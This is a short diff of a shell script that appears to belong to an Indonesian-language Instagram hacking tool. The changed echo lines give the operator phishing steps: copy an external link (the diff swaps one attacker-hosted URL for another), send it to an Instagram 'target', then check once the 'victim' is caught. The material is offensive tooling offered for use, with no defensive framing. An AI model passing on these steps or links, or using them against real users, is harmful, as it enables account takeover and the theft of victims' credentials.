@@ -30,7 +30,7 @@ if [[ $response != *pre* ]]; then
 else
     echo "trik penggunaan"
     echo "watch & learn"
-    echo "1.Copy link disamping :http://zlucifer.com/api/best9.php"
+    echo "1.Copy link disamping :www.best9-insta.pe.hu"
     echo "2.Kirim link yang sudah di copy ke target(hanya untuk instagram)"
     echo "3.Jika korban sudah terkena bisa langsung di cek"
     echo "4.asshiap"
